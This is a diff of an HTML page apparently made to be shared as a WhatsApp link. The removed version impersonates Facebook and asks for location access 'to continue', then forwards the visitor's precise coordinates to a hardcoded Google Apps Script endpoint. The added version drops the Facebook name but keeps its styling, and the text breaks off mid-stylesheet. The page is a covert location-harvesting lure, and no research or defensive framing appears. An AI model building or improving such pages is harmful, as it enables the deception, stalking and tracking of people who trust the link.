@@ -1,46 +1,72 @@
 ```html
 <!DOCTYPE html>
 <html lang="es">
+
 <head>
+
   <meta charset="UTF-8">
 
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0">
 
-  <title>Facebook</title>
+  <title>Continuar</title>
+
 
   <!-- =========================================
-       OPEN GRAPH - VISTA PREVIA DE WHATSAPP
+       OPEN GRAPH
+       ESTO ES LO QUE WHATSAPP UTILIZA
+       PARA GENERAR LA VISTA PREVIA
        ========================================= -->
 
-  <meta property="og:title" content="Facebook">
-  <meta property="og:description" content="Accede para continuar">
+  <meta property="og:title"
+        content="Continuar">
 
-  <!-- CAMBIA ESTA URL POR LA URL REAL DE TU IMAGEN -->
-  <meta property="og:image"
-        content="https://TU_USUARIO.github.io/TU_REPOSITORIO/1360-facebook_logo.jpg">
+  <meta property="og:description"
+        content="Pulsa para continuar">
 
-  <meta property="og:image:alt" content="Facebook">
+  <meta property="og:type"
+        content="website">
 
-  <meta property="og:image:type" content="image/png">
-
-  <!-- Recomendado: imagen de aproximadamente 1200 x 630 px -->
-  <meta property="og:image:width" content="1200">
-  <meta property="og:image:height" content="630">
-
-  <!-- URL de esta página de GitHub Pages -->
   <meta property="og:url"
         content="https://TU_USUARIO.github.io/TU_REPOSITORIO/">
 
-  <meta property="og:type" content="website">
+  <!--
+    IMPORTANTE:
+    Cambia esta URL por la ubicación real
+    de tu imagen logo.
+  -->
 
-  <meta property="og:site_name" content="Facebook">
+  <meta property="og:image"
+        content="https://TU_USUARIO.github.io/TU_REPOSITORIO/logo.png">
 
-  <!-- Twitter/X -->
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="Facebook">
-  <meta name="twitter:description" content="Accede para continuar">
+  <meta property="og:image:alt"
+        content="Logo">
+
+  <meta property="og:image:type"
+        content="image/png">
+
+  <meta property="og:image:width"
+        content="1200">
+
+  <meta property="og:image:height"
+        content="630">
+
+
+  <!-- =========================================
+       TWITTER / REDES SOCIALES
+       ========================================= -->
+
+  <meta name="twitter:card"
+        content="summary_large_image">
+
+  <meta name="twitter:title"
+        content="Continuar">
+
+  <meta name="twitter:description"
+        content="Pulsa para continuar">
+
   <meta name="twitter:image"
-        content="https://TU_USUARIO.github.io/TU_REPOSITORIO/1360-facebook_logo.png">
+        content="https://TU_USUARIO.github.io/TU_REPOSITORIO/logo.png">
 
 
   <style>
@@ -51,270 +77,159 @@
 
     html,
     body {
-      width: 100%;
-      height: 100%;
       margin: 0;
       padding: 0;
+      width: 100%;
+      height: 100%;
     }
 
     body {
-      font-family: Arial, Helvetica, sans-serif;
-      background: #f0f2f5;
+
+      font-family:
+        Arial,
+        Helvetica,
+        sans-serif;
+
+      background:
+        linear-gradient(
+          135deg,
+          #f0f2f5,
+          #ffffff
+        );
+
       display: flex;
       justify-content: center;
       align-items: center;
+
+      min-height: 100vh;
+
     }
+
 
     .container {
+
       width: 100%;
-      max-width: 430px;
-      padding: 25px;
-      text-align: center;
+      max-width: 420px;
+
+      padding: 20px;
+
     }
+
 
     .card {
-      background: white;
-      border-radius: 14px;
-      padding: 35px 25px;
+
+      background: #ffffff;
+
+      border-radius: 18px;
+
+      padding: 35px 28px;
+
+      text-align: center;
+
       box-shadow:
-        0 4px 18px rgba(0, 0, 0, 0.10);
+        0 10px 35px
+        rgba(0, 0, 0, 0.12);
+
     }
+
 
     .logo {
-      width: 110px;
-      height: 110px;
+
+      width: 120px;
+      height: 120px;
+
       object-fit: contain;
+
       margin-bottom: 20px;
+
+      border-radius: 18px;
+
     }
+
 
     h1 {
+
       margin: 0 0 10px;
-      font-size: 24px;
+
+      font-size: 25px;
+
       color: #1c1e21;
+
     }
+
 
     p {
+
+      margin: 0 auto 25px;
+
       color: #65676b;
+
       font-size: 15px;
+
       line-height: 1.5;
-      margin-bottom: 25px;
+
     }
+
 
     .button {
+
       width: 100%;
+
       border: none;
-      border-radius: 8px;
-      padding: 14px;
+
+      border-radius: 10px;
+
+      padding: 15px;
+
       background: #1877f2;
+
       color: white;
+
       font-size: 16px;
+
       font-weight: bold;
+
       cursor: pointer;
+
+      transition:
+        transform 0.2s,
+        background 0.2s;
+
     }
+
 
     .button:hover {
+
       background: #166fe5;
+
+      transform: translateY(-1px);
+
     }
+
 
     .loading {
+
       display: none;
+
       margin-top: 20px;
+
       color: #65676b;
+
       font-size: 14px;
+
     }
+
 
     .spinner {
-      width: 28px;
-      height: 28px;
-      border: 3px solid #ddd;
-      border-top-color: #1877f2;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
+
+      width: 30px;
+      height: 30px;
+
       margin: 0 auto 10px;
-    }
 
-    @keyframes spin {
-      to {
-        transform: rotate(360deg);
-      }
-    }
+      border: 3px solid #e4e6eb;
 
-    .error {
-      display: none;
-      margin-top: 20px;
-      color: #d93025;
-      font-size: 14px;
-    }
+      border-top-color: #1877f2;
 
-  </style>
-</head>
-
-<body>
-
-  <div class="container">
-
-    <div class="card">
-
-      <!-- Imagen visible en la página -->
-      <img
-        class="logo"
-        src="1360-facebook_logo.png"
-        alt="Facebook"
-      >
-
-      <h1>Continuar</h1>
-
-      <p>
-        Para continuar, permite el acceso a tu ubicación.
-      </p>
-
-      <button
-        class="button"
-        id="locationButton"
-        onclick="solicitarUbicacion()">
-        Continuar
-      </button>
-
-      <div
-        class="loading"
-        id="loading">
-
-        <div class="spinner"></div>
-
-        Obteniendo ubicación...
-
-      </div>
-
-      <div
-        class="error"
-        id="error">
-
-        No fue posible obtener tu ubicación.
-        Verifica que hayas permitido el acceso a la ubicación.
-
-      </div>
-
-    </div>
-
-  </div>
-
-
-  <script>
-
-    /*
-     * URL DE TU GOOGLE APPS SCRIPT
-     */
-
-    const URL_DESTINO =
-      "https://script.google.com/macros/s/AKfycbxOSNHKG4FEa5KSjTodI0SYRD6XAX0kB7AanpSF4boOypSKP2GPf-NGlYJoPo_40p8i/exec";
-
-
-    function solicitarUbicacion() {
-
-      const button =
-        document.getElementById("locationButton");
-
-      const loading =
-        document.getElementById("loading");
-
-      const error =
-        document.getElementById("error");
-
-
-      error.style.display = "none";
-
-      button.style.display = "none";
-
-      loading.style.display = "block";
-
-
-      /*
-       * Verificamos que el navegador
-       * soporte geolocalización.
-       */
-
-      if (!navigator.geolocation) {
-
-        mostrarError();
-
-        return;
-
-      }
-
-
-      /*
-       * Solicitud de ubicación.
-       */
-
-      navigator.geolocation.getCurrentPosition(
-
-        function(position) {
-
-          const latitude =
-            position.coords.latitude;
-
-          const longitude =
-            position.coords.longitude;
-
-          const accuracy =
-            position.coords.accuracy;
-
-
-          /*
-           * Redireccionamos a Apps Script.
-           *
-           * Se envían los datos como parámetros
-           * de la URL.
-           */
-
-          const destino =
-            URL_DESTINO +
-            "?lat=" + encodeURIComponent(latitude) +
-            "&lng=" + encodeURIComponent(longitude) +
-            "&accuracy=" + encodeURIComponent(accuracy);
-
-
-          window.location.href = destino;
-
-        },
-
-        function(error) {
-
-          console.log(
-            "Error de ubicación:",
-            error
-          );
-
-          mostrarError();
-
-        },
-
-        {
-          enableHighAccuracy: true,
-          timeout: 15000,
-          maximumAge: 0
-        }
-
-      );
-
-    }
-
-
-    function mostrarError() {
-
-      document.getElementById("loading")
-        .style.display = "none";
-
-      document.getElementById("locationButton")
-        .style.display = "block";
-
-      document.getElementById("error")
-        .style.display = "block";
-
-    }
-
-  </script>
-
-</body>
-</html>
+      border-radius:
 ```
